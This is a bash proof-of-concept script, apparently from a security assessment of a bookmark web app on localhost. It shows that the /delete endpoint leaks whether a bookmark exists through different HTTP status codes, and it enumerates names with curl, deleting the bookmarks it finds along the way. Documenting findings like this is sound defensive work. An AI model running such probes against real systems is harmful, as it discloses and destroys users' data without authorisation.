#!/bin/bash

# POC: HTTP Status Code Information Disclosure in /delete Endpoint
# Demonstrates enumerating bookmark existence via status code differences
# HTTP 200 = bookmark exists (was deleted)
# HTTP 302 = bookmark doesn't exist (redirect)

TARGET_URL="http://localhost:5000"
COOKIES_FILE="/tmp/bookmark_cookies.txt"

echo "[*] HTTP Status Code Enumeration - Bookmark Existence Detection"
echo "[*] Target: $TARGET_URL/delete"
echo ""

# Step 1: Create a test session by adding a known bookmark
echo "[+] Step 1: Creating authenticated session and adding test bookmark..."
curl -s -c "$COOKIES_FILE" \
  -X POST \
  -d "url=https://example.com&name=TestBookmark123" \
  "$TARGET_URL/add" > /dev/null

if [ ! -f "$COOKIES_FILE" ]; then
  echo "[-] Failed to create session"
  exit 1
fi

echo "[+] Session created successfully"
echo ""

# Step 2: Attempt to delete existing bookmark
echo "[+] Step 2: Attempting to delete EXISTING bookmark (TestBookmark123)..."
EXISTING_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -b "$COOKIES_FILE" \
  "$TARGET_URL/delete?name=TestBookmark123")

echo "[*] HTTP Status Code: $EXISTING_STATUS"
if [ "$EXISTING_STATUS" = "200" ]; then
  echo "[+] CONFIRMED: Bookmark exists - returned HTTP 200 (deletion successful)"
else
  echo "[!] Unexpected status: $EXISTING_STATUS"
fi
echo ""

# Step 3: Attempt to delete non-existent bookmark
echo "[+] Step 3: Attempting to delete NON-EXISTENT bookmark (FakeBookmark999)..."
FAKE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -b "$COOKIES_FILE" \
  "$TARGET_URL/delete?name=FakeBookmark999")

echo "[*] HTTP Status Code: $FAKE_STATUS"
if [ "$FAKE_STATUS" = "302" ]; then
  echo "[+] CONFIRMED: Bookmark doesn't exist - returned HTTP 302 (redirect)"
else
  echo "[!] Unexpected status: $FAKE_STATUS"
fi
echo ""

# Step 4: Demonstrate enumeration attack
echo "[+] Step 4: Demonstrating bookmark enumeration attack..."
echo "[*] Testing multiple bookmark names to determine which exist..."
echo ""

TEST_NAMES=("TestBookmark123" "AdminBookmark" "FakeTest1" "FakeTest2" "NonExistent999")
ENUM_RESULTS=""

for name in "${TEST_NAMES[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -b "$COOKIES_FILE" \
    "$TARGET_URL/delete?name=$name")
  
  if [ "$STATUS" = "200" ]; then
    RESULT="EXISTS (HTTP 200)"
    ENUM_RESULTS="${ENUM_RESULTS}[FOUND] $name: $RESULT\n"
  else
    RESULT="NOT FOUND (HTTP $STATUS)"
  fi
  
  echo "[*] $name: $RESULT"
done

echo ""
echo "[+] VULNERABILITY CONFIRMED:"
echo "[+] - Existing bookmarks return HTTP 200"
echo "[+] - Non-existent bookmarks return HTTP 302"
echo "[+] - This allows an attacker to enumerate bookmark names"
echo "[+] - Status code difference leaks information about which bookmarks exist"

# Cleanup
rm -f "$COOKIES_FILE"

exit 0